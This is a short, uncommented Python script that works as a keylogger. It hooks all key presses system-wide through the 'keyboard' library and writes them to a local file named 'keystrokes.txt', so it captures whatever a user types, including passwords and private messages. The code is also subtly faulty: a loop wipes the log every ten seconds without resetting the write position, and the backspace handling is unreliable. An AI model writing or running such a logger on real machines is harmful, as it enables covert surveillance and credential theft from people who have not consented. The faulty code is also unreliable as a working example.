import sys
import keyboard
import asyncio
import time

log_file = open('keystrokes.txt', 'w')


def on_key_press(event):
    if event.name == 'enter':
        log_file.write('\n')
    elif event.name == 'space':
        log_file.write(' ')
    elif event.name == 'backspace':
        size = log_file.tell()
        log_file.truncate(size - 1)
    elif event.name == '?' or event.name == '.' or event.name == '!':
        log_file.write(event.name + '\n')
    elif event.name == 'alttab' or event.name == 'tab':
        pass
    elif event.name == 'shift' or event.name == 'right shift':
        pass
    else:
        log_file.write(event.name)
    log_file.flush()

async def main():
    while True:
        await asyncio.sleep(10)
        log_file.truncate(0)

keyboard.on_press(on_key_press)
asyncio.run(main())
